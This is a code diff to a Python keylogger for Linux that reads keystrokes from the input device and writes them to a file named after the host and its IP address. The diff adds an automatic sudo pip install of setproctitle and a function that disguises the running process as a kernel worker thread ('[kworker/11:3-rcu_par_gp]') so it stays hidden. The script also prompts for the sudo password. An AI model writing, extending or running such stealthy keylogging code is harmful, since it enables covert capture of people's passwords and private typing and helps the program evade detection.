@@ -158,6 +158,31 @@ KEY_DICTIONARY_MAP = {
 }
 
 
+def __check_dependencies():
+    """
+    Checks if user/host machine has the "setproctitle" package,
+    if not, then installs it.
+
+    For manual installation: pip install setproctitle
+
+    :return: None
+    """
+    try:
+        import setproctitle
+    except ImportError as e:
+        print(f"[+] MISSING DEPENDENCY: setproctitle is not installed: {e}")
+        print("[+] INSTALL PENDING: Now installing setproctitle...")
+        try:
+            # Use subprocess to run the 'pip install' command
+            subprocess.check_call(['sudo', 'pip', 'install', "setproctitle"])
+            print(f"[+] INSTALL SUCCESSFUL: Successfully installed setproctitle")
+        except subprocess.CalledProcessError as e:
+            print(f"[+] ERROR: Failed to install setproctitle: {e}")
+            sys.exit("[+] PROGRAM TERMINATE: Now terminating program...")
+        except Exception as e:
+            print(f"[+] ERROR: An unexpected error occurred: {str(e)}")
+
+
 def __create_write_to_keylog_file(filename: str, buffer: str):
     """
     Creates a .txt file and writes the recorded keystrokes from the buffer to it.
@@ -197,6 +222,16 @@ def __create_file_name():
     filename = f"{hostname}_{ip_address}_{current_datetime}.txt"  # Format: {Hostname}_{IP_addr}_{Date}_{Time}
 
     return filename
+
+
+def __hide_process_name():
+    import setproctitle
+    FAKE_PROCESS_NAME = "[kworker/11:3-rcu_par_gp]"
+    setproctitle.setproctitle(FAKE_PROCESS_NAME)
+
+    # Get the process ID of the current script
+    pid = os.getpid()
+    print("[+] Process ID:", pid)
 
 
 def __get_kb_event(password: str, cmd: str):
@@ -316,13 +351,15 @@ def __perform_keylog(event_x: str,
 
 
 if __name__ == '__main__':
+    # Check setproctitle dependency on host machine
+    __check_dependencies()
+
+    # Obscure process name
+    __hide_process_name()
+
     # Initialize Variables
     signal_stop = False
-
-    # Get the sudo password from the user
-    sudo_password = getpass.getpass("[+] Enter your sudo password: ")
-
-    # The Linux command to find which eventX is the keyboard from /dev/input
+    sudo_password = getpass.getpass("[+] Enter your sudo password: ")  # Get the sudo password from the user
     command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
 
 # a) Use subprocess to run the sudo command
